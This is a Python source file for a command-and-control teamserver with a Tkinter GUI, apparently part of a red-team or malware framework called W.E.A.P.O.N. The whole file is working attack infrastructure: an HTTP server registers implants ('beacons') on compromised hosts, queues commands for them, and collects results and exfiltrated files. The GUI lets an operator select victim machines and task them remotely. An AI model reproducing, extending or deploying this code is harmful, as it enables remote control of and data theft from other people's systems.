import threading
import tkinter as tk
from tkinter import ttk
from tkinter.scrolledtext import ScrolledText
import sys
import getpass
import socket
import platform
import io
import uuid
import os
import json
from urllib.parse import urlparse, parse_qs
import base64
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
from http.server import BaseHTTPRequestHandler, HTTPServer

import c2_commands

BEACONS = {}
RESULTS = {}
TASKS = {}

from configs.config import STAGER_KEY, HOST, PORT


os.makedirs("downloads", exist_ok=True)

class TeamServerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode()
        try:
            data = json.loads(post_data)
        except json.JSONDecodeError:
            self._set_headers(400)
            self.wfile.write(json.dumps({"error": "Invalid JSON"}).encode())
            return

        # 🔐 Validate stager key
        if data.get("key") != STAGER_KEY:
            self._set_headers(403)
            self.wfile.write(json.dumps({"error": "Unauthorized"}).encode())
            return

        if self.path == "/register":
            beacon_id = data.get("id")
            if beacon_id:
                BEACONS[beacon_id] = {
                    "info": data,
                    "tasks": [],
                    "results": []
                }
                print(f"[+] Beacon registered: {beacon_id}")
                self._set_headers()
                self.wfile.write(json.dumps({"status": "registered"}).encode())
            else:
                self._set_headers(400)
                self.wfile.write(json.dumps({"error": "Missing ID"}).encode())

        elif self.path == "/result":
            beacon_id = data.get("id")
            task_id = data.get("task_id")
            result = data.get("result")

            if beacon_id and task_id:
                task = TASKS.get(task_id)
                if task and task["type"] == "download":
                    filename = os.path.basename(task.get("path", f"{task_id}.bin"))
                    filepath = f"downloads/{filename}"
                    try:
                        with open(filepath, "wb") as f:
                            f.write(base64.b64decode(result))
                        print(f"[+] File saved: {filepath}")
                        RESULTS[task_id] = f"File saved: {filepath}"
                        BEACONS[beacon_id]["results"].append(f"File saved: {filepath}")
                    except Exception as e:
                        print(f"[-] Failed to save file: {e}")
                        RESULTS[task_id] = f"Failed to save file: {e}"
                        BEACONS[beacon_id]["results"].append(f"Failed to save file: {e}")
                else:
                    RESULTS[task_id] = result
                    print(f"[+] Result from {beacon_id}:\n{result.strip()}")
                    BEACONS[beacon_id]["results"].append(result.strip())

                self._set_headers()
                self.wfile.write(json.dumps({"status": "result_received"}).encode())
            else:
                self._set_headers(400)
                self.wfile.write(json.dumps({"error": "Missing fields"}).encode())

        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({"error": "Unknown endpoint"}).encode())

    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        path = parsed.path

        if path == "/task":
            beacon_id = query.get("id", [None])[0]
            key = query.get("key", [None])[0]

            # 🔐 Validate stager key in GET
            if key != STAGER_KEY:
                self._set_headers(403)
                self.wfile.write(json.dumps({"error": "Unauthorized"}).encode())
                return

            if beacon_id in BEACONS:
                if BEACONS[beacon_id]["tasks"]:
                    task = BEACONS[beacon_id]["tasks"].pop(0)
                    TASKS[task["task_id"]] = task
                    self._set_headers()
                    self.wfile.write(json.dumps(task).encode())
                else:
                    self._set_headers(204)
                    self.wfile.write(b'')
            else:
                self._set_headers(404)
                self.wfile.write(json.dumps({"error": "Beacon not found"}).encode())

        elif path == "/beacons":
            self._set_headers()
            beacon_list = {bid: data["info"] for bid, data in BEACONS.items()}
            self.wfile.write(json.dumps(beacon_list, indent=2).encode())

        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({"error": "Not found"}).encode())


def run_server():
    server = HTTPServer((HOST, PORT), TeamServerHandler)
    print(f"[*] Teamserver listening on {HOST}:{PORT}")
    server.serve_forever()


class StdoutRedirector(io.StringIO):
    def __init__(self, text_widget):
        super().__init__()
        self.text_widget = text_widget

    def write(self, s):
        self.text_widget.configure(state='normal')
        self.text_widget.insert(tk.END, s)
        self.text_widget.see(tk.END)
        self.text_widget.configure(state='disabled')

    def flush(self):
        pass


class C2Gui(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("W.E.A.P.O.N Teamserver GUI")
        self.geometry("1200x800")
        self.configure(bg="#121212")

        self.beacon_listbox = tk.Listbox(self, bg="#1e1e1e", fg="magenta", font=("Consolas", 10), selectbackground="#007acc")
        self.beacon_listbox.pack(side=tk.TOP, fill=tk.X, padx=10, pady=10)
        self.beacon_listbox.bind("<<ListboxSelect>>", self.on_beacon_select)

        right_frame = tk.Frame(self, bg="#121212")
        right_frame.pack(side=tk.BOTTOM, fill=tk.X, expand=True, padx=10, pady=10)

        self.console_text = ScrolledText(right_frame, bg="#000000", fg="#00ffff", font=("Consolas", 11))
        self.console_text.config(state=tk.DISABLED)
        self.console_text.pack(fill=tk.BOTH, expand=True)

        self.command_entry = tk.Entry(right_frame, bg="#1e1e1e", fg="white", font=("Consolas", 12))
        self.command_entry.pack(fill=tk.X, pady=5)
        self.command_entry.bind("<Return>", self.execute_command)

        self.selected_beacon = None

        self.stdout_redirector = StdoutRedirector(self.console_text)
        sys.stdout = self.stdout_redirector
        sys.stderr = self.stdout_redirector

        c2_commands.init(BEACONS, RESULTS, TASKS)
        c2_commands.help_menu()
        

        self.after(2000, self.refresh_beacon_list)

    def refresh_beacon_list(self):
        current_selection = self.beacon_listbox.curselection()
        self.beacon_listbox.delete(0, tk.END)
        for beacon_id, data in BEACONS.items():
            info = data.get("info", {})
            hostname = info.get("hostname", "unknown")
            ip = info.get("ip", "0.0.0.0")
            os_name = info.get("os", "unknown")
            username = getpass.getuser()
            display = f"{hostname}({username}) ({ip}) [{os_name}] - {beacon_id[:8]}"
            self.beacon_listbox.insert(tk.END, display)
        if current_selection:
            try:
                self.beacon_listbox.selection_set(current_selection)
            except Exception:
                pass
        self.after(2000, self.refresh_beacon_list)

    def on_beacon_select(self, event):
        if not self.beacon_listbox.curselection():
            self.selected_beacon = None
            return
        idx = self.beacon_listbox.curselection()[0]
        beacon_ids = list(BEACONS.keys())
        if idx < len(beacon_ids):
            self.selected_beacon = beacon_ids[idx]
            self.append_console(f"[+] Selected beacon: {self.selected_beacon[:8]}")
            self.command_entry.delete(0, tk.END)

    def execute_command(self, event=None):
        cmd = self.command_entry.get().strip()
        if not cmd:
            return
        if not self.selected_beacon:
            self.append_console("[!] Select a beacon first.")
            self.command_entry.delete(0, tk.END)
            return

        commands_with_beacon = ["task", "upload", "download"]
        parts = cmd.split()
        if parts and parts[0] in commands_with_beacon:
            if len(parts) < 2 or parts[1] != self.selected_beacon:
                parts.insert(1, self.selected_beacon)
                cmd = " ".join(parts)

        try:
            c2_commands.execute(cmd)
        except Exception as e:
            self.append_console(f"[-] Command execution error: {e}")
        self.command_entry.delete(0, tk.END)

    def append_console(self, text):
        self.console_text.config(state=tk.NORMAL)
        self.console_text.insert(tk.END, text + "\n")
        self.console_text.see(tk.END)
        self.console_text.config(state=tk.DISABLED)


if __name__ == "__main__":
    threading.Thread(target=run_server, daemon=True).start()
    app = C2Gui()
    app.mainloop()

